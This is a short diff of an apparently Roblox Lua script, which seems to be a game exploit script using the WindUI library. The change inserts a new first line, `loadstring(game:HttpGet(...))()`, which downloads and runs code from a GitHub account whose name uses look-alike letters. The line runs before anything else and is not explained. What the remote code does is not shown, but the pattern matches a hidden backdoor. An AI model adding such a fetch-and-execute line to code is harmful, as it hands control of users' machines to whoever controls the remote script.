@@ -1,4 +1,4 @@
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BIudnyHoIandan/MM2/refs/heads/main/ServerPlayerScript"))()
 
 -- Load WindUI safely
 local success, WindUI = pcall(function()
